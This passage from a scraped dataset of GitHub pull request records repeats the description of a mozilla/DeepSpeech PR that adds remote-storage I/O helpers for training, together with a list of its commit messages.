I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42170a57eb4d14120b847cde95998b3c91d9b7d7,Remote I/O for config
288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,933d96dc7435074a3861627c29ee88fecfef773a,Fix relative imports
289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,396ac7fe4685c9eeeed5e1dd8a9c9d69e56019c7,Remote I/O for downloader
290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de317cf59289ece0d3cce92f7171d9d68554aa5,Remote I/O for evaluate_tools
291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,296b74e01a9409beb593a69ae885b30875031bb2,Remote I/O for sample_collections
292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abe5dd2eb4bbab122c96138f841d9f6a572f0ca9,Remote I/O for taskcluster
293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3dc4c0d5c1a301c661d957bfaf6e2aae36dc20c,Fix bad I/O helper fn replace errors
294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d503bd69ec11e455cad2b39275e033c5642eb32,Add universal is_remote_path to I/O helper
295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad0883042126f265bcc6c7180313746beb257535,Work remote I/O into audio utils -- a bit more involved
296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90e2e1f7d26cffe603dc47d75b1fda6f330a4799,"Respect buffering, encoding, newline, closefd, and opener if we're looking at a local file"
297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f310729989db0fd1b9368d258fe89bad352b06b,Fix startswith check
298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6322b384e9c0c55f72151799ce78e2728117626,Fix remote I/O handling in train
299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0030cab22078592134ce9950c8e6fb603af0679b,Skip remote zipping for now
300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64d278560dc20b6f623bc3770e527e6d9f551829,Why do we need absolute paths everywhere here?
301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,783cdad8db471cc33c0f9d9fa79b0b1c8d4c198b,Fix downloader and taskcluster directory mgmt with remote I/O
302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8fe972eb6f296f0bb1bbb4b8f51657c7660656b6,Fix wave file reading helpers
303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86cba458c556227e5c685fce81a7112cb76af7dd,Fix remote path handling for CSV sample reading
304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc0b4956431271f0b7caa834492aaf71fd2768d2,TODO: CSVWriter still totally breaks with remote paths
305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be39d3354dc71499b5fa461c8ce2983779b9f262,Perform data loading I/O within worker process rather than main process by wrapping Sample
306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2332e7fb76c72dc9d7bc2ca73823ebfa83ec85b9,Linter fix: define self.tmp_src_file_path in init
307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d2b09b951241885d773a42d3a5c20188216a2bb,"Linter seems unhappy with conditional imports. Make gfile a module-level import.

I usually do this as a conditional because tf takes a while to load and it's nice to skip it when you want to run a script that just preps data or something like that, but it doesn't seem like a big deal."
308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47020e4ecbcb30976104e3ad9dbf7af5b9945cd7,Add an imap_unordered helper to LimitPool -- I might experiment with this
309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c1a183c671063ae113c2f9d1ac710dc4b8efc76,Clean up print debugging statements
310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb6d4ca361da6283f75ca5e57edea4f55d08bf68,Add disclaimers to CSV and Tar writers
311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

